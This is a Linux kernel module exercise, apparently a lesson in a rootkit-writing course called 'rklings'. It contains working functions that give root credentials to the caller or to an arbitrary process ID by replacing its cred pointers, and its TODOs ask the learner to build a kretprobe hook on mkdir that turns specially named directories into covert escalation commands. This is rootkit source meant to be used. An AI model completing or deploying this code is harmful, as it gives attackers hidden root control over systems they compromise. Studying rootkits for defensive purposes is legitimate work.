// SPDX-License-Identifier: GPL-2.0
//
// Your task: upgrade from kprobe to kretprobe and build a command
// dispatcher that routes "rklings.<cmd>[.<arg>]" mkdir names to
// handler functions (ping, status, escalate).
//
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static unsigned int escalation_count;
static int deferred_pid;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_try_deferred(void)
{
	int ret;

	if (deferred_pid <= 0)
		return 0;
	ret = rk_escalate_pid(deferred_pid);
	if (ret == 0)
		deferred_pid = 0;
	return ret;
}

/* TODO: Implement command handlers: rk_cmd_ping, rk_cmd_status, rk_cmd_escalate.
 * Each takes (const char *arg) and returns int.
 * ping: log to dmesg. status: log escalation_count and deferred_pid.
 * escalate: no arg calls rk_escalate(), otherwise parse PID and escalate it
 * (defer if the process does not exist yet). */

/* TODO: Implement rk_dispatch(const char *name).
 * Parse the suffix after RK_PREFIX into a command and optional argument
 * (separated by '.'), then route to the matching handler.
 * Commands: "e" (escalate), "ping", "status". Return -ENOENT for unknown. */

/* TODO: Implement the kretprobe entry and return handlers for __x64_sys_mkdir.
 * Use a per-instance data struct to carry the dispatch result and whether
 * interception happened. The entry handler extracts and checks the pathname
 * (same pattern as L08), calls rk_dispatch, and nullifies the pathname.
 * The return handler overrides the syscall return value if intercepted. */

/* TODO: Define the static struct kretprobe for __x64_sys_mkdir. */

static int rk_proc_show(struct seq_file *m, void *v)
{
	rk_try_deferred();
	if (deferred_pid > 0)
		seq_printf(m, "deferred: %d\n", deferred_pid);
	else
		seq_puts(m, "idle\n");
	seq_printf(m, "escalations: %u\n", escalation_count);
	return 0;
}

static int __init rk_init(void)
{
	/* TODO: Register the kretprobe and create /proc/rklings. */
	return 0;
}

static void __exit rk_exit(void)
{
	/* TODO: Remove /proc/rklings and unregister the kretprobe. */
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings command dispatcher");
